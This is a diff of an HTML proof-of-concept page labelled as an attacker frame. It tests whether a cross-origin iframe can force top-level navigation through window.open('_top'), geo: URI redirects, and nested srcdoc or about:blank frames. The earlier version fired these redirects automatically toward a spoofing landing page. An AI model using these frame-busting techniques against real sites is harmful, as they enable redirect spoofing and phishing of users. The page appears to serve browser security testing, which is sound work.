@@ -1,59 +1,154 @@
 <!doctype html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="utf-8" />
-  <title>Attacker iframe</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Attacker — PoC actions</title>
   <style>
-    body { font-family: -apple-system, system-ui, Roboto, Arial; padding: 12px;}
-    .box { border:1px solid #ccc;padding:8px;border-radius:6px;background:#fff; }
-    button { margin-top:8px; }
+    body{font-family:-apple-system,system-ui,Roboto,Arial;padding:16px;background:#fff}
+    .card{padding:10px;margin-bottom:12px;border-radius:8px;border:1px solid #e6edf3}
+    button{margin:6px;padding:8px 12px;border-radius:8px;border:1px solid #cbd5e1;background:#fff}
+    .muted{color:#6b7280}
+    .log{background:#0b1220;color:#e6f3ff;padding:8px;border-radius:6px;font-family:monospace;white-space:pre-wrap;max-height:200px;overflow:auto}
   </style>
 </head>
 <body>
-  <h3>Attacker iframe (host origin: <span id="me"></span>)</h3>
-  <div class="box">
-    <p>Variant A: auto <code>window.open(url, '_top')</code> on load (after 2s)</p>
-    <p>Variant B: create <code>&lt;a target="_top"&gt;</code> and click it programmatically (after 6s)</p>
-    <button id="run-manual">Run manual open now</button>
+  <div class="card">
+    <h2>Attacker frame actions</h2>
+    <p class="muted">Host this file on Attacker origin (HTTPS). Load it inside Victim iframe (Victim must be different origin).</p>
+    <div>
+      <button id="btn-window-open-top">Call window.open(url, '_top')</button>
+      <button id="btn-location-geo">Set location.href = 'geo:...'</button>
+      <button id="btn-create-nested">Create nested iframe that does geo redirect</button>
+      <button id="btn-srcdoc-open">Create srcdoc iframe that calls window.open('_top')</button>
+      <button id="btn-aboutblank-write">Write into about:blank iframe and call window.open()</button>
+    </div>
+    <p class="muted">Use manual actions first. For server-redirect-to-geo test, configure attacker server endpoint to return 302 Location: geo:...</p>
+  </div>
+
+  <div class="card">
+    <h3>Console / postMessage log</h3>
+    <div id="log" class="log"></div>
   </div>
 
   <script>
-    document.getElementById('me').textContent = location.origin;
-
-    function notifyParent(msg) {
-      try { parent.postMessage(msg, '*'); } catch(e) { /* ignore */ }
-      console.log('[Attacker iframe] ', msg);
+    const logEl = document.getElementById('log');
+    function log(msg){ const ts=new Date().toISOString(); logEl.textContent = `[${ts}] ${msg}\n` + logEl.textContent; console.log(msg); }
+    function notifyParent(info){
+      try { parent.postMessage(info, '*'); } catch(e){ log('postMessage failed: '+e.message); }
+      log('notifyParent: '+info);
     }
 
-    // Variant A: automatic top-level window.open (after short delay)
-    setTimeout(() => {
-      const url = 'https://syarifmsajjad.github.io/test-spoofing/landing'; // attacker-controlled URL
-      notifyParent('VariantA: about to call window.open -> ' + url);
+    // Variant A: window.open('_top') to attacker landing (same-origin open)
+    document.getElementById('btn-window-open-top').addEventListener('click', ()=>{
+      const url = location.origin + '/landing.html?via=windowopen_top';
+      notifyParent('VariantA: about to call window.open -> '+url);
       try {
-        // This attempts to navigate top-level
         window.open(url, '_top');
-      } catch(e) { notifyParent('VariantA error: ' + e); }
-    }, 2000);
+        notifyParent('VariantA: called window.open');
+      } catch(e) {
+        notifyParent('VariantA error: '+e.message);
+      }
+    });
 
-    // Variant B: programmatic <a target="_top"> click (after longer delay)
-    setTimeout(() => {
-      const a = document.createElement('a');
-      a.href = 'https://syarifmsajjad.github.io/test-spoofing/landing?via=target_top';
-      a.target = '_top';
-      a.rel = 'noopener noreferrer';
-      a.textContent = 'clicker';
-      document.body.appendChild(a);
-      notifyParent('VariantB: created <a target="_top"> element; triggering click');
+    // Variant B: location.href = 'geo:...'
+    document.getElementById('btn-location-geo').addEventListener('click', ()=>{
+      const uri = 'geo:37.7749,-122.4194?q=PoC-Attacker';
+      notifyParent('VariantB: about to set location.href -> '+uri);
       try {
-        a.click(); // programmatic click
-      } catch(e) { notifyParent('VariantB error: ' + e); }
-    }, 6000);
+        location.href = uri;
+        notifyParent('VariantB: set location.href to geo');
+      } catch(e){
+        notifyParent('VariantB error: '+e.message);
+      }
+    });
 
-    // Manual trigger
-    document.getElementById('run-manual').addEventListener('click', () => {
-      notifyParent('Manual trigger: calling window.open');
-      window.open('https://syarifmsajjad.github.io/test-spoofing/landing?manual=1', '_top');
+    // Variant C: nested iframe -> inner location.href geo:
+    document.getElementById('btn-create-nested').addEventListener('click', ()=>{
+      notifyParent('VariantC: creating nested iframe that will redirect to geo onload');
+      const inner = document.createElement('iframe');
+      inner.style.width='100%'; inner.style.height='140px';
+      inner.srcdoc = `
+        <body>
+          <div>inner nested iframe — will set location.href to geo after 150ms</div>
+          <script>
+            parent.postMessage('nested-inner: ready', '*');
+            setTimeout(()=> {
+              try { location.href = 'geo:37.7749,-122.4194?q=nested'; parent.postMessage('nested-inner: set location to geo', '*'); } catch(e){ parent.postMessage('nested-inner error:'+e.message, '*'); }
+            },150);
+          <\/script>
+        </body>
+      `;
+      document.body.appendChild(inner);
+    });
+
+    // Variant D: srcdoc early navigation -> window.open('_top')
+    document.getElementById('btn-srcdoc-open').addEventListener('click', ()=>{
+      notifyParent('VariantD: injecting srcdoc iframe that will call window.open');
+      const f = document.createElement('iframe');
+      f.style.width='100%'; f.style.height='160px';
+      f.srcdoc = `
+        <body>
+          <div>srcdoc: will call window.open('_top') after 100ms</div>
+          <script>
+            try { parent.postMessage('srcdoc: pre open', '*'); } catch(e){}
+            setTimeout(() => {
+              try {
+                window.open('${location.origin}/landing.html', '_top');
+                parent.postMessage('srcdoc: called window.open to landing', '*');
+              } catch(e){
+                parent.postMessage('srcdoc error:'+e.message, '*');
+              }
+            }, 100);
+          <\/script>
+        </body>
+      `;
+      document.body.appendChild(f);
+    });
+
+    // Variant E: about:blank document.write -> window.open
+    document.getElementById('btn-aboutblank-write').addEventListener('click', ()=>{
+      notifyParent('VariantE: creating about:blank iframe then writing content that will call window.open');
+      const f = document.createElement('iframe');
+      f.style.width='100%'; f.style.height='160px';
+      f.src = 'about:blank';
+      f.addEventListener('load', ()=>{
+        try {
+          const doc = f.contentWindow.document;
+          doc.open();
+          doc.write(\`
+            <body>
+              <div>about:blank injected content — will call window.open('_top') after 120ms</div>
+              <script>
+                try { parent.postMessage('aboutblank-injected: ready', '*'); } catch(e){}
+                setTimeout(()=> {
+                  try {
+                    window.open('${location.origin}/landing.html', '_top');
+                    parent.postMessage('aboutblank-injected: called window.open', '*');
+                  } catch(e) {
+                    parent.postMessage('aboutblank-injected error:'+e.message, '*');
+                  }
+                }, 120);
+              <\/script>
+            </body>
+          \`);
+          doc.close();
+        } catch(ex){
+          notifyParent('VariantE error writing into about:blank: '+ex.message);
+        }
+      });
+      document.body.appendChild(f);
+    });
+
+    // Optional: landing page in attacker origin to show when navigation succeeds
+    if(location.pathname.endsWith('/landing.html')){
+      document.body.innerHTML = '<h2>Attacker landing page</h2><p>If you see this, top-level navigation committed.</p>';
+      try { parent.postMessage('attacker-landing: loaded', '*'); } catch(e){}
+    }
+
+    // Listen for postMessages from nested frames if any (for extra logging)
+    window.addEventListener('message', (ev)=> {
+      log('inner postMessage: origin='+ev.origin+' data='+JSON.stringify(ev.data));
     });
   </script>
 </body>
